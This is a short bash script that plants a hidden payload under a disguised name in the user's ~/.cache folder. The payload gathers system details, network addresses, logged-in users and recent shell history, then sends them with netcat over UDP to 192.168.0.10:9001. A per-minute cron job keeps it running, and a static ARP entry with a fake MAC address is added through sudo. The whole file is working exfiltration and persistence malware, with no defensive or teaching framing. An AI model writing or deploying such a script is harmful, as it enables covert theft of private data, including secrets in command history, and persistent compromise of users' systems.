#!/bin/bash

USER_NAME=$(whoami)
DEST_IP="192.168.0.10"
DEST_PORT="9001"
PAYLOAD_PATH="/home/$USER_NAME/.cache/NDA0c2VjcmV0c25vdGZvdW5k.sh"
CRON_CMD="$PAYLOAD_PATH >/dev/null 2>&1"
CRON_JOB="* * * * * $CRON_CMD"
FAKE_MAC="F0:0D:F0:0D:F0:0D"

# Recreate payload if missing
if [ ! -f "$PAYLOAD_PATH" ]; then
  mkdir -p "$(dirname "$PAYLOAD_PATH")"
  cat > "$PAYLOAD_PATH" << EOF
#!/bin/bash

OUTPUT_FILE="/tmp/system_profile.txt"

{
  uname -a
  echo
  who
  echo
  ip addr show
  echo
  tail -20 ~/.bash_history
} > "\$OUTPUT_FILE"

# Use UDP instead of TCP
nc -u "$DEST_IP" "$DEST_PORT" < "\$OUTPUT_FILE"
EOF

  chmod +x "$PAYLOAD_PATH"
fi

# Ensure cron job is present
crontab -l 2>/dev/null | grep -F -- "$CRON_CMD" >/dev/null
if [ $? -ne 0 ]; then
  (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
fi

# Ensure static ARP entry exists
arp -n | grep -q "$DEST_IP"
if [ $? -ne 0 ]; then
  sudo arp -s $DEST_IP $FAKE_MAC
fi